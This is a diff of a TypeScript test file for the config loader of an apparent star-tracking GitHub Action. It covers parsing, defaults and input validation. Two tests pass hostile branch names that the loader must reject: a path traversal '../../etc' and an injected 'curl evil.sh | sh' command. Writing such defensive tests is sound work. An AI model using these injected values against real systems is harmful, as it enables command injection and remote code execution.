@@ -6,12 +6,14 @@ import { loadConfig, loadConfigFile } from './loader';
 import {
   parseBool,
   parseDecimal,
+  parseFileBool,
   parseHexColor,
   parseList,
   parseNotificationThreshold,
   parseNumber,
+  toStringList,
 } from './parsers';
-import { ChartCurve, Visibility } from './types';
+import { ChartCurve, CompareAgainst, NotificationMode, Visibility } from './types';
 
 vi.mock('@actions/core', () => ({
   getInput: vi.fn().mockReturnValue(''),
@@ -29,14 +31,22 @@ vi.mock('fs', async (importOriginal) => {
   };
 });
 
+function mockInputs(inputs: Record<string, string>): void {
+  vi.mocked(core.getInput).mockImplementation((name: string) => inputs[name] ?? '');
+}
+
 describe('parseList', () => {
-  it('returns empty array for empty string', () => {
-    expect(parseList('')).toEqual([]);
+  it('returns undefined for empty string', () => {
+    expect(parseList('')).toBeUndefined();
   });
 
-  it('returns empty array for null/undefined', () => {
-    expect(parseList(null)).toEqual([]);
-    expect(parseList(undefined)).toEqual([]);
+  it('returns undefined for null/undefined', () => {
+    expect(parseList(null)).toBeUndefined();
+    expect(parseList(undefined)).toBeUndefined();
+  });
+
+  it('returns undefined for whitespace only', () => {
+    expect(parseList('   ')).toBeUndefined();
   });
 
   it('splits comma-separated values and trims whitespace', () => {
@@ -60,9 +70,78 @@ describe('parseBool', () => {
     expect(parseBool(true)).toBe(true);
   });
 
-  it('parses anything else as false', () => {
+  it('parses "false" as false', () => {
     expect(parseBool('false')).toBe(false);
-    expect(parseBool('yes')).toBe(false);
+    expect(parseBool(false)).toBe(false);
+  });
+
+  it('ignores case and surrounding whitespace', () => {
+    expect(parseBool('True')).toBe(true);
+    expect(parseBool(' TRUE ')).toBe(true);
+    expect(parseBool('FALSE')).toBe(false);
+  });
+
+  it('returns undefined for unrecognized values instead of disabling the option', () => {
+    expect(parseBool('yes')).toBeUndefined();
+    expect(parseBool('1')).toBeUndefined();
+    expect(parseBool('nope')).toBeUndefined();
+  });
+});
+
+describe('parseFileBool', () => {
+  it('returns undefined for empty/null/undefined', () => {
+    expect(parseFileBool('')).toBeUndefined();
+    expect(parseFileBool(null)).toBeUndefined();
+    expect(parseFileBool(undefined)).toBeUndefined();
+  });
+
+  it('passes through real booleans', () => {
+    expect(parseFileBool(true)).toBe(true);
+    expect(parseFileBool(false)).toBe(false);
+  });
+
+  it('accepts the YAML boolean vocabulary', () => {
+    expect(parseFileBool('yes')).toBe(true);
+    expect(parseFileBool('on')).toBe(true);
+    expect(parseFileBool('no')).toBe(false);
+    expect(parseFileBool('off')).toBe(false);
+  });
+
+  it('treats a quoted "false" as false rather than a truthy string', () => {
+    expect(parseFileBool('false')).toBe(false);
+    expect(parseFileBool('False')).toBe(false);
+  });
+
+  it('returns undefined for unrecognized values', () => {
+    expect(parseFileBool('maybe')).toBeUndefined();
+    expect(parseFileBool({})).toBeUndefined();
+  });
+});
+
+describe('toStringList', () => {
+  it('returns undefined for null/undefined', () => {
+    expect(toStringList(null)).toBeUndefined();
+    expect(toStringList(undefined)).toBeUndefined();
+  });
+
+  it('passes through arrays', () => {
+    expect(toStringList(['a', 'b'])).toEqual(['a', 'b']);
+  });
+
+  it('preserves an empty array', () => {
+    expect(toStringList([])).toEqual([]);
+  });
+
+  it('splits a scalar string', () => {
+    expect(toStringList('a, b')).toEqual(['a', 'b']);
+  });
+
+  it('stringifies non-string array entries', () => {
+    expect(toStringList([1, 2])).toEqual(['1', '2']);
+  });
+
+  it('returns undefined for other shapes', () => {
+    expect(toStringList({})).toBeUndefined();
   });
 });
 
@@ -79,6 +158,23 @@ describe('parseNumber', () => {
 
   it('returns undefined for non-numeric strings', () => {
     expect(parseNumber('abc')).toBeUndefined();
+  });
+
+  it('rejects partially numeric strings instead of truncating them', () => {
+    expect(parseNumber('1o')).toBeUndefined();
+    expect(parseNumber('42abc')).toBeUndefined();
+    expect(parseNumber('3.7')).toBeUndefined();
+  });
+
+  it('accepts surrounding whitespace and a sign', () => {
+    expect(parseNumber(' 42 ')).toBe(42);
+    expect(parseNumber('-5')).toBe(-5);
+  });
+
+  it('truncates real numbers coming from the config file', () => {
+    expect(parseNumber(7)).toBe(7);
+    expect(parseNumber(7.9)).toBe(7);
+    expect(parseNumber(Number.POSITIVE_INFINITY)).toBeUndefined();
   });
 });
 
@@ -161,12 +257,10 @@ describe('loadConfigFile', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     vi.mocked(core.getInput).mockReturnValue('');
-    vi.mocked(fs.existsSync).mockReturnValue(false);
     vi.mocked(fs.readFileSync).mockReturnValue('');
   });
 
   it('returns empty object when file does not exist', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
     expect(loadConfigFile('star-tracker.yml')).toEqual({});
   });
 
@@ -237,13 +331,10 @@ describe('loadConfig', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     vi.mocked(core.getInput).mockReturnValue('');
-    vi.mocked(fs.existsSync).mockReturnValue(false);
     vi.mocked(fs.readFileSync).mockReturnValue('');
   });
 
   it('uses defaults when no config file and no inputs', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.visibility).toBe(DEFAULTS.visibility);
@@ -258,11 +349,7 @@ describe('loadConfig', () => {
     vi.mocked(fs.existsSync).mockReturnValue(true);
     vi.mocked(fs.readFileSync).mockReturnValue('visibility: "public"\nmin_stars: 10');
 
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'visibility') return 'private';
-      if (name === 'min-stars') return '20';
-      return '';
-    });
+    mockInputs({ visibility: 'private', 'min-stars': '20' });
 
     const config = loadConfig();
 
@@ -271,51 +358,299 @@ describe('loadConfig', () => {
   });
 
   it('throws on invalid visibility', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'visibility') return 'invalid';
-      return '';
-    });
+    mockInputs({ visibility: 'invalid' });
 
     expect(() => loadConfig()).toThrow(/Invalid visibility/);
   });
 
+  it('throws on a visibility inherited from Object.prototype', () => {
+    mockInputs({ visibility: 'toString' });
+
+    expect(() => loadConfig()).toThrow(/Invalid visibility "toString"/);
+  });
+
+  it('lets config file values win over built-in defaults for every overridable key', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue(
+      [
+        'data_branch: my-data',
+        'max_history: 10',
+        'include_charts: false',
+        'locale: es',
+        'top_repos: 3',
+        'track_stargazers: true',
+        'smart_sampling: true',
+        'smart_sampling_threshold: 900',
+        'smart_sampling_pages: 7',
+        'chart_max_points: 12',
+        'chart_y_axis_side: right',
+        'chart_smoothing: false',
+        'chart_curve: catmull-rom',
+        'chart_show_points: false',
+        'chart_animation: false',
+        'chart_milestones: false',
+        'chart_begin_at_zero: true',
+        'chart_theme: dark',
+        'chart_range: 30d',
+        'chart_trend_line: true',
+        'velocity_metrics: true',
+      ].join('\n'),
+    );
+
+    const config = loadConfig();
+
+    expect(config.dataBranch).toBe('my-data');
+    expect(config.maxHistory).toBe(10);
+    expect(config.includeCharts).toBe(false);
+    expect(config.locale).toBe('es');
+    expect(config.topRepos).toBe(3);
+    expect(config.trackStargazers).toBe(true);
+    expect(config.smartSampling).toBe(true);
+    expect(config.smartSamplingThreshold).toBe(900);
+    expect(config.smartSamplingPages).toBe(7);
+    expect(config.chartMaxPoints).toBe(12);
+    expect(config.chartYAxisSide).toBe('right');
+    expect(config.chartSmoothing).toBe(false);
+    expect(config.chartCurve).toBe(ChartCurve.CATMULL_ROM);
+    expect(config.chartShowPoints).toBe(false);
+    expect(config.chartAnimation).toBe(false);
+    expect(config.chartMilestones).toBe(false);
+    expect(config.chartBeginAtZero).toBe(true);
+    expect(config.chartTheme).toBe('dark');
+    expect(config.chartRange).toBe('30d');
+    expect(config.chartTrendLine).toBe(true);
+    expect(config.velocityMetrics).toBe(true);
+  });
+
+  it('rejects a data-branch that could escape the worktree path', () => {
+    mockInputs({ 'data-branch': '../../etc' });
+
+    expect(() => loadConfig()).toThrow(/Invalid data-branch/);
+  });
+
+  it('rejects a data-branch carrying shell metacharacters', () => {
+    mockInputs({ 'data-branch': 'main; curl evil.sh | sh' });
+
+    expect(() => loadConfig()).toThrow(/Invalid data-branch/);
+  });
+
+  it('accepts a namespaced data-branch', () => {
+    mockInputs({ 'data-branch': 'data/star-tracker' });
+
+    expect(loadConfig().dataBranch).toBe('data/star-tracker');
+  });
+
+  it('defaults read-only to false', () => {
+    expect(loadConfig().readOnly).toBe(false);
+  });
+
+  it('parses read-only from the input', () => {
+    mockInputs({ 'read-only': 'true' });
+
+    expect(loadConfig().readOnly).toBe(true);
+  });
+
+  it('reads read_only from the config file without a hand-written mapping', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('read_only: true');
+
+    expect(loadConfig().readOnly).toBe(true);
+  });
+
+  it('warns on an unparseable numeric input instead of silently ignoring it', () => {
+    mockInputs({ 'min-stars': '1o' });
+
+    const config = loadConfig();
+
+    expect(config.minStars).toBe(DEFAULTS.minStars);
+    expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('Invalid min-stars "1o"'));
+  });
+
+  it('does not warn when a numeric input is absent', () => {
+    loadConfig();
+
+    expect(core.warning).not.toHaveBeenCalledWith(expect.stringContaining('Invalid min-stars'));
+  });
+
+  it('warns when a notification threshold is combined with read-only', () => {
+    mockInputs({ 'read-only': 'true', 'notification-threshold': '500' });
+
+    loadConfig();
+
+    expect(core.warning).toHaveBeenCalledWith(
+      expect.stringContaining('notification-threshold is set to "500" on a read-only run'),
+    );
+  });
+
+  it('does not warn about read-only when the threshold is 0', () => {
+    mockInputs({ 'read-only': 'true' });
+
+    loadConfig();
+
+    expect(core.warning).not.toHaveBeenCalledWith(expect.stringContaining('on a read-only run'));
+  });
+
+  it('defaults sendOnNoChanges from DEFAULTS', () => {
+    const config = loadConfig();
+
+    expect(config.sendOnNoChanges).toBe(DEFAULTS.sendOnNoChanges);
+  });
+
+  it('splits a scalar exclude_repos instead of leaving it a string', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('exclude_repos: test-repo');
+
+    const config = loadConfig();
+
+    expect(config.excludeRepos).toEqual(['test-repo']);
+  });
+
+  it('preserves an empty list from the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('only_repos: []');
+
+    const config = loadConfig();
+
+    expect(config.onlyRepos).toEqual([]);
+  });
+
+  it('treats a quoted boolean in the config file as a boolean', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('include_archived: "false"');
+
+    const config = loadConfig();
+
+    expect(config.includeArchived).toBe(false);
+  });
+
+  it('accepts YAML-style booleans in the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('track_stargazers: "yes"');
+
+    const config = loadConfig();
+
+    expect(config.trackStargazers).toBe(true);
+  });
+
+  it('rejects an invalid chart_line_width from the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('chart_line_width: -3');
+
+    const config = loadConfig();
+
+    expect(config.chartLineWidth).toBe(DEFAULTS.chartLineWidth);
+  });
+
+  it('reads every config file key, including ones without dedicated tests', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue(
+      ['chart_y_axis_side: right', 'smart_sampling_pages: 7', 'chart_begin_at_zero: true'].join(
+        '\n',
+      ),
+    );
+
+    const config = loadConfig();
+
+    expect(config.chartYAxisSide).toBe('right');
+    expect(config.smartSamplingPages).toBe(7);
+    expect(config.chartBeginAtZero).toBe(true);
+  });
+
   it('parses notification-threshold as number', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'notification-threshold') return '5';
-      return '';
-    });
+    mockInputs({ 'notification-threshold': '5' });
 
     const config = loadConfig();
     expect(config.notificationThreshold).toBe(5);
   });
 
   it('parses notification-threshold as auto', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'notification-threshold') return 'auto';
-      return '';
-    });
+    mockInputs({ 'notification-threshold': 'auto' });
 
     const config = loadConfig();
     expect(config.notificationThreshold).toBe('auto');
   });
 
-  it('defaults notification-threshold to auto', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
+  it('defaults notification-threshold to 0', () => {
+    const config = loadConfig();
+
+    expect(config.notificationThreshold).toBe(0);
+  });
+
+  it('reads notification-threshold from the config file when no input is set', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('notification_threshold: 500');
 
     const config = loadConfig();
 
-    expect(config.notificationThreshold).toBe('auto');
+    expect(config.notificationThreshold).toBe(500);
+  });
+
+  it('parses notification-mode', () => {
+    mockInputs({ 'notification-mode': 'gains' });
+
+    const config = loadConfig();
+
+    expect(config.notificationMode).toBe(NotificationMode.GAINS);
+  });
+
+  it('reads notification-mode from the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('notification_mode: "gains"');
+
+    const config = loadConfig();
+
+    expect(config.notificationMode).toBe(NotificationMode.GAINS);
+  });
+
+  it('warns and falls back on invalid notification-mode', () => {
+    mockInputs({ 'notification-mode': 'gross' });
+
+    const config = loadConfig();
+
+    expect(config.notificationMode).toBe(DEFAULTS.notificationMode);
+    expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('Invalid notification-mode'));
+  });
+
+  it('defaults notification-mode to net', () => {
+    const config = loadConfig();
+
+    expect(config.notificationMode).toBe(NotificationMode.NET);
+  });
+
+  it('parses compare-against', () => {
+    mockInputs({ 'compare-against': '7d' });
+
+    const config = loadConfig();
+
+    expect(config.compareAgainst).toBe(CompareAgainst.D7);
+  });
+
+  it('reads compare-against from the config file', () => {
+    vi.mocked(fs.existsSync).mockReturnValue(true);
+    vi.mocked(fs.readFileSync).mockReturnValue('compare_against: "30d"');
+
+    const config = loadConfig();
+
+    expect(config.compareAgainst).toBe(CompareAgainst.D30);
+  });
+
+  it('warns and falls back on invalid compare-against', () => {
+    mockInputs({ 'compare-against': 'weekly' });
+
+    const config = loadConfig();
+
+    expect(config.compareAgainst).toBe(DEFAULTS.compareAgainst);
+    expect(core.warning).toHaveBeenCalledWith(expect.stringContaining('Invalid compare-against'));
+  });
+
+  it('defaults compare-against to last-run', () => {
+    const config = loadConfig();
+
+    expect(config.compareAgainst).toBe(CompareAgainst.LAST_RUN);
   });
 
   it('parses exclude-repos input as comma-separated list', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'exclude-repos') return 'repo-a, repo-b';
-      return '';
-    });
+    mockInputs({ 'exclude-repos': 'repo-a, repo-b' });
 
     const config = loadConfig();
 
@@ -323,11 +658,7 @@ describe('loadConfig', () => {
   });
 
   it('parses only-orgs input as comma-separated list', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'only-orgs') return 'org-a, org-b';
-      return '';
-    });
+    mockInputs({ 'only-orgs': 'org-a, org-b' });
 
     const config = loadConfig();
 
@@ -335,11 +666,7 @@ describe('loadConfig', () => {
   });
 
   it('parses exclude-orgs input as comma-separated list', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'exclude-orgs') return 'org-x,org-y';
-      return '';
-    });
+    mockInputs({ 'exclude-orgs': 'org-x,org-y' });
 
     const config = loadConfig();
 
@@ -357,8 +684,6 @@ describe('loadConfig', () => {
   });
 
   it('defaults org filters to empty arrays', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.onlyOrgs).toEqual(DEFAULTS.onlyOrgs);
@@ -366,8 +691,6 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart line color and width', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartLineColor).toBe(DEFAULTS.chartLineColor);
@@ -375,12 +698,7 @@ describe('loadConfig', () => {
   });
 
   it('parses chart-line-color and chart-line-width inputs', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-line-color') return '#6f42c1';
-      if (name === 'chart-line-width') return '4';
-      return '';
-    });
+    mockInputs({ 'chart-line-color': '#6f42c1', 'chart-line-width': '4' });
 
     const config = loadConfig();
 
@@ -389,11 +707,7 @@ describe('loadConfig', () => {
   });
 
   it('preserves decimal chart-line-width (does not truncate 2.5)', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-line-width') return '2.5';
-      return '';
-    });
+    mockInputs({ 'chart-line-width': '2.5' });
 
     const config = loadConfig();
 
@@ -401,11 +715,7 @@ describe('loadConfig', () => {
   });
 
   it('falls back and warns on invalid chart-line-color', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-line-color') return 'red';
-      return '';
-    });
+    mockInputs({ 'chart-line-color': 'red' });
 
     const config = loadConfig();
 
@@ -414,11 +724,7 @@ describe('loadConfig', () => {
   });
 
   it('accepts a bare hex chart-line-color without the leading #', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-line-color') return '6b63ff';
-      return '';
-    });
+    mockInputs({ 'chart-line-color': '6b63ff' });
 
     const config = loadConfig();
 
@@ -426,8 +732,6 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-max-points and chart-y-axis-side', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartMaxPoints).toBe(DEFAULTS.chartMaxPoints);
@@ -435,11 +739,7 @@ describe('loadConfig', () => {
   });
 
   it('parses chart-max-points input including 0 for full history', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-max-points') return '0';
-      return '';
-    });
+    mockInputs({ 'chart-max-points': '0' });
 
     const config = loadConfig();
 
@@ -447,11 +747,7 @@ describe('loadConfig', () => {
   });
 
   it('parses chart-y-axis-side input', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-y-axis-side') return 'right';
-      return '';
-    });
+    mockInputs({ 'chart-y-axis-side': 'right' });
 
     const config = loadConfig();
 
@@ -459,11 +755,7 @@ describe('loadConfig', () => {
   });
 
   it('falls back and warns on invalid chart-y-axis-side', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-y-axis-side') return 'top';
-      return '';
-    });
+    mockInputs({ 'chart-y-axis-side': 'top' });
 
     const config = loadConfig();
 
@@ -472,19 +764,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-smoothing to true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartSmoothing).toBe(true);
   });
 
   it('parses chart-smoothing input as false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-smoothing') return 'false';
-      return '';
-    });
+    mockInputs({ 'chart-smoothing': 'false' });
 
     const config = loadConfig();
 
@@ -492,19 +778,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-show-points to true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartShowPoints).toBe(true);
   });
 
   it('parses chart-show-points input as false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-show-points') return 'false';
-      return '';
-    });
+    mockInputs({ 'chart-show-points': 'false' });
 
     const config = loadConfig();
 
@@ -512,19 +792,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-animation to true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartAnimation).toBe(true);
   });
 
   it('parses chart-animation input as false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-animation') return 'false';
-      return '';
-    });
+    mockInputs({ 'chart-animation': 'false' });
 
     const config = loadConfig();
 
@@ -532,19 +806,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-milestones to true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartMilestones).toBe(true);
   });
 
   it('parses chart-milestones input as false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-milestones') return 'false';
-      return '';
-    });
+    mockInputs({ 'chart-milestones': 'false' });
 
     const config = loadConfig();
 
@@ -552,19 +820,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-begin-at-zero to false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartBeginAtZero).toBe(false);
   });
 
   it('parses chart-begin-at-zero input as true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-begin-at-zero') return 'true';
-      return '';
-    });
+    mockInputs({ 'chart-begin-at-zero': 'true' });
 
     const config = loadConfig();
 
@@ -572,19 +834,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-theme to auto', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartTheme).toBe('auto');
   });
 
   it('parses chart-theme input as dark', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-theme') return 'dark';
-      return '';
-    });
+    mockInputs({ 'chart-theme': 'dark' });
 
     const config = loadConfig();
 
@@ -592,11 +848,7 @@ describe('loadConfig', () => {
   });
 
   it('warns and falls back to auto for an invalid chart-theme', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-theme') return 'sepia';
-      return '';
-    });
+    mockInputs({ 'chart-theme': 'sepia' });
 
     const config = loadConfig();
 
@@ -605,19 +857,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-custom-milestones to an empty list', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartCustomMilestones).toEqual([]);
   });
 
   it('parses, sorts and de-duplicates chart-custom-milestones input', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-custom-milestones') return '750, 250, 750, abc, -5, 2500';
-      return '';
-    });
+    mockInputs({ 'chart-custom-milestones': '750, 250, 750, abc, -5, 2500' });
 
     const config = loadConfig();
 
@@ -636,10 +882,7 @@ describe('loadConfig', () => {
   it('prefers the chart-custom-milestones input over the config file', () => {
     vi.mocked(fs.existsSync).mockReturnValue(true);
     vi.mocked(fs.readFileSync).mockReturnValue('chart_custom_milestones:\n- 999');
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-custom-milestones') return '42';
-      return '';
-    });
+    mockInputs({ 'chart-custom-milestones': '42' });
 
     const config = loadConfig();
 
@@ -656,11 +899,7 @@ describe('loadConfig', () => {
   });
 
   it('warns and falls back when chart-custom-milestones input has no valid numbers', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-custom-milestones') return 'abc, -5, 0';
-      return '';
-    });
+    mockInputs({ 'chart-custom-milestones': 'abc, -5, 0' });
 
     const config = loadConfig();
 
@@ -671,19 +910,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-range to all', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartRange).toBe('all');
   });
 
   it('parses chart-range input as 90d', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-range') return '90d';
-      return '';
-    });
+    mockInputs({ 'chart-range': '90d' });
 
     const config = loadConfig();
 
@@ -691,11 +924,7 @@ describe('loadConfig', () => {
   });
 
   it('warns and falls back to all for an invalid chart-range', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-range') return '7d';
-      return '';
-    });
+    mockInputs({ 'chart-range': '7d' });
 
     const config = loadConfig();
 
@@ -704,15 +933,12 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-curve to monotone', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartCurve).toBe(ChartCurve.MONOTONE);
   });
 
   it('parses chart-curve input as rounded-step', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
     vi.mocked(core.getInput).mockImplementation((name: string) => {
       if (name === 'chart-curve') return ChartCurve.ROUNDED_STEP;
       return '';
@@ -724,11 +950,7 @@ describe('loadConfig', () => {
   });
 
   it('warns and falls back to monotone for an invalid chart-curve', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-curve') return 'wavy';
-      return '';
-    });
+    mockInputs({ 'chart-curve': 'wavy' });
 
     const config = loadConfig();
 
@@ -737,19 +959,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults chart-trend-line to false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.chartTrendLine).toBe(false);
   });
 
   it('parses chart-trend-line input as true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'chart-trend-line') return 'true';
-      return '';
-    });
+    mockInputs({ 'chart-trend-line': 'true' });
 
     const config = loadConfig();
 
@@ -757,19 +973,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults velocity-metrics to false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.velocityMetrics).toBe(false);
   });
 
   it('parses velocity-metrics input as true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'velocity-metrics') return 'true';
-      return '';
-    });
+    mockInputs({ 'velocity-metrics': 'true' });
 
     const config = loadConfig();
 
@@ -777,19 +987,13 @@ describe('loadConfig', () => {
   });
 
   it('defaults track-stargazers to false', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.trackStargazers).toBe(false);
   });
 
   it('parses track-stargazers input as true', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'track-stargazers') return 'true';
-      return '';
-    });
+    mockInputs({ 'track-stargazers': 'true' });
 
     const config = loadConfig();
 
@@ -806,8 +1010,6 @@ describe('loadConfig', () => {
   });
 
   it('defaults smart sampling options', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-
     const config = loadConfig();
 
     expect(config.smartSampling).toBe(DEFAULTS.smartSampling);
@@ -816,12 +1018,10 @@ describe('loadConfig', () => {
   });
 
   it('parses smart-sampling inputs', () => {
-    vi.mocked(fs.existsSync).mockReturnValue(false);
-    vi.mocked(core.getInput).mockImplementation((name: string) => {
-      if (name === 'smart-sampling') return 'true';
-      if (name === 'smart-sampling-threshold') return '5000';
-      if (name === 'smart-sampling-pages') return '10';
-      return '';
+    mockInputs({
+      'smart-sampling': 'true',
+      'smart-sampling-threshold': '5000',
+      'smart-sampling-pages': '10',
     });
 
     const config = loadConfig();
